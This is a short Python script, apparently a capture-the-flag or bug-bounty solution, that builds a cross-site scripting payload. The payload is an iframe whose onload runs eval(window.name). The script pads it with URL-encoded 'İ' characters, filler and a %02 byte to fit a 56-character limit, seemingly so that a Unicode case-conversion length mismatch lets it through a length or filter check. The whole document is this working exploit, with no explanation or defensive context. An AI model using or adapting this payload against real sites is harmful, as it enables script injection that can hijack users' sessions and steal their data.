payload = "<iframe onload=eval(window.name)>"
maxLength = 56

numRepeat = (maxLength - len(payload)) // 3
remainder = (maxLength - len(payload)) % 3

payload = payload + "%C4%B0" * numRepeat + "a" * remainder + "%02"

print(payload)